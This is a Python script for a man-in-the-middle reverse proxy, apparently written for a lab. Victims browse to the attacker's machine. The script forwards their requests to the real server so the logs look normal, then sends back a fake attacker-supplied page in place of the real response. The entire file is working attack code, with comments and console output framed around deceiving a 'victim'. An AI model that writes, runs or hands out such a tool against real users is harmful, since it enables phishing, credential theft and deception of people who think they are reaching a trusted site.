#!/usr/bin/env python3
"""
MITM Reverse Proxy - No root/sudo required.

The victim connects to THIS proxy thinking it's the real server.
The proxy fetches the real response, throws it away, and sends
the fake page instead.

Usage: python3 mitm_proxy.py

Victim browses to:  http://<attacker_ip>:9000
Proxy forwards to:  http://<server_ip>:8000  (but replaces the response)
"""

import socket
import threading
import os
from config import SERVER_IP, TARGET_PORT, FAKE_PAGE

LISTEN_PORT = 9000  # Port the victim connects to (no root needed for >1024)


def load_fake_page(path):
    with open(path, "r") as f:
        return f.read()


def build_http_response(body):
    body_bytes = body.encode("utf-8")
    response = (
        "HTTP/1.1 200 OK\r\n"
        "Content-Type: text/html; charset=UTF-8\r\n"
        f"Content-Length: {len(body_bytes)}\r\n"
        "Connection: close\r\n"
        "\r\n"
    )
    return response.encode("utf-8") + body_bytes


def forward_to_server(request_data):
    """Forward the request to the real server (to keep it realistic in logs)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((SERVER_IP, TARGET_PORT))
        s.sendall(request_data)
        response = s.recv(8192)
        s.close()
        return response
    except Exception:
        return None


def handle_client(client_sock, client_addr, fake_page):
    try:
        request = client_sock.recv(4096)
        if not request:
            client_sock.close()
            return

        first_line = request.split(b"\r\n")[0].decode("utf-8", errors="replace")
        print(f"[+] Victim {client_addr[0]}:{client_addr[1]} -> {first_line}")

        # Forward to real server (optional - just so the server sees the request)
        real_response = forward_to_server(request)
        if real_response:
            real_first_line = real_response.split(b"\r\n")[0].decode("utf-8", errors="replace")
            print(f"    Real server responded: {real_first_line}")
        else:
            print(f"    Real server unreachable (doesn't matter, we fake it anyway)")

        # Send the fake page to the victim
        response = build_http_response(fake_page)
        client_sock.sendall(response)
        print(f"    -> Injected fake page ({len(fake_page)} bytes)")

    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        client_sock.close()


def main():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    fake_page_path = os.path.join(script_dir, FAKE_PAGE)
    fake_page = load_fake_page(fake_page_path)

    print("============================================")
    print("  MITM Reverse Proxy (no sudo required)")
    print("============================================")
    print(f"  Listening on     : 0.0.0.0:{LISTEN_PORT}")
    print(f"  Real server      : {SERVER_IP}:{TARGET_PORT}")
    print(f"  Fake page        : {FAKE_PAGE}")
    print("============================================")
    print()
    print(f"  Victim should browse to:")
    print(f"    http://<this machine's IP>:{LISTEN_PORT}")
    print()
    print("  Press Ctrl+C to stop.")
    print()

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", LISTEN_PORT))
    server.listen(10)

    try:
        while True:
            client_sock, client_addr = server.accept()
            t = threading.Thread(target=handle_client,
                                 args=(client_sock, client_addr, fake_page))
            t.daemon = True
            t.start()
    except KeyboardInterrupt:
        print("\n[*] Shutting down.")
        server.close()


if __name__ == "__main__":
    main()
